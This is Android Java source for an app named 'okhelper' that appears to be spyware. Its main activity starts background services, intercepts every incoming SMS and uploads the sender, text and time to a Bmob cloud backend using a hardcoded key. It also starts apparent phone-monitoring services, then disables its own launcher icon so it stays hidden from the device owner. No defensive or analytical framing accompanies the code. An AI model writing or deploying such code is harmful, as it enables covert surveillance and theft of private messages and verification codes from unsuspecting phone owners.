package ooo.xxx.okhelper;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import cn.bmob.v3.Bmob;
import cn.bmob.v3.listener.SaveListener;
import ooo.xxx.okhelper.Receiver.PhoneReceiver;
import ooo.xxx.okhelper.Receiver.SMSBroadcastReceiver;
import ooo.xxx.okhelper.Receiver.SMSBroadcastReceiver.MessageListener;
import ooo.xxx.okhelper.Receiver.SMSReceiver;
import ooo.xxx.okhelper.bean.MsgContent;
import ooo.xxx.okhelper.services.MyService;
import ooo.xxx.okhelper.services.PhoneService;

public class MainActivity extends Activity {
	
	SMSBroadcastReceiver mSMSBroadcastReceiver;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);	

		Bmob.initialize(this, "65e5589a2951bdfa2eb80ad0a2d35a85");
		
		init();

		HideMysehlf();
	}

	private void init() {
		Intent service = new Intent();
		service.setClass(this, MyService.class);
		startService(service);

/*		Intent sms = new Intent();
		sms.setClass(this, SMSReceiver.class);
		startService(sms);*/
		
		mSMSBroadcastReceiver = new SMSBroadcastReceiver();  
        mSMSBroadcastReceiver.setOnReceivedMessageListener(new MessageListener() {  
            public void OnReceived(String message) {      
                String[] msg=message.split(",");  
                MsgContent msgContent=new MsgContent();  
                msgContent.setForm(msg[0]);  
                msgContent.setContent(msg[1]);  
                msgContent.setTime(msg[2]);  
                msgContent.save(MainActivity.this, new SaveListener() {  
                      
                    @Override  
                    public void onSuccess() {//上传成功  
                          
                    }  
                      
                    @Override  
                    public void onFailure(int arg0, String arg1) {  
                          
                    }  
                });  
                  
            }  
        });  

		Intent phone = new Intent();
		phone.setClass(this, PhoneReceiver.class);
		startService(phone);
		
		Intent phoneService = new Intent();
		phoneService.setClass(this, PhoneService.class);
		startService(phoneService);
	}

	
	private void HideMysehlf() {
		PackageManager p = getPackageManager();
		p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
				PackageManager.DONT_KILL_APP);
		finish();
	}
}
